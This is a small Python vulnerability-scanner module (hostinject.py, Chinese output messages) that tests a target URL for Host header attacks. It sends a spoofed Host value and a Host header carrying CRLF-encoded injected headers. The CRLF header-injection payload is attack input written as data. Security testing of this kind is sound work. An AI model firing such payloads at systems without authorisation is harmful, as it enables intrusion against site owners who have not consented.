# -*- encoding: utf-8 -*-
'''
@File : hostinject.py
@Time : 2019/07/07 14:48:03
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''

import requests
import sys
import re
from lib import *
# import ssl

# ssl._create_default_https_context = ssl._create_unverified_context

def hostinject(url):
    try:
        print('\n')
        print(Vcolors.OKBLUE + "正在对目标url进行HOST主机头注入漏洞探测~~" + Vcolors.ENDC)
        headers={'Host' : 'www.je2setest.com'}
        headers1={'Host' : 'www.je2setest.com%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo'}
        try:
            req = requests.get(url, headers = headers, timeout = 5)
            resp = str(req.headers) + str(req.text)
        except:
            req1 = requests.get(url, headers = headers1, timeout = 5) 
            resp =str(req1.headers) + str(req1.text)         
        if 'www.je2setest.com' in resp:
            print(Vcolors.RED + "存在HOST头攻击漏洞~~" + Vcolors.ENDC)
        elif '12345/foo' in resp :
            print(Vcolors.RED + "存在HOST主机头注入漏洞~~" + Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN + "不存在HOST主机头注入漏洞~~" + Vcolors.ENDC)
    except:
        pass